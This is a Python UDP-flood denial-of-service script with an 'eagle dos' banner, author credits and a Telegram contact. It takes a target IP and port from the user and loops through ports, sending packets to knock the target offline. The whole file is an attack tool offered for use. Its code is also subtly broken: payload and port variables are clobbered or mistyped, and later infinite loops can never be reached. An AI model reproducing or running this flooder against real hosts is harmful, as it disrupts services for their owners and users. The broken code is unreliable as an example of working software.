#Author WHITE L'
import socket
import os
import random
import time
import sys

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(32000)
bytes = random._urandom(35521)
bytes = random._urandom(655213)
bytes = random._urandom(655133)

os.system("clear")
print(" ")
print("                              $$\                       $ \                     ")
print("                              $$ |                      $$ |                    ")
print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
print("                    $$\   $$ |                                                  ")
print("                    \$$$$$$  |                                                  ")
print("                     \______/                                                   ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : RevampiLiom" + N + "   RevampLion From - " + B + "" + R + "RevampiLion" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : white-eagle\033[0m")
print("\033[33mGithub 	       : https://github.com/WH1T3-E4GL3/\033[0m")
print("\033[33mTelegram       : https://t.me/Ka_KsHi_HaTaKe\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Target's IP : ")
port = input("[+] Target port : ")
sent = input("[+] Packet Sent : ")
ping = input("[+] 1-500000 : ")

os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
time.sleep(3)
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
time.sleep(3)
while True:
    sent = 0
    for ping in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        time.sleep(3)
while True:
    sent = 0
    for ping in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for random in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
while True:
    sent = 0
    for random in range(1, 65534):
        white.sendto(random, (ip, port))
        sent = sent + 1
        port = port + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Mengirim Packet \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
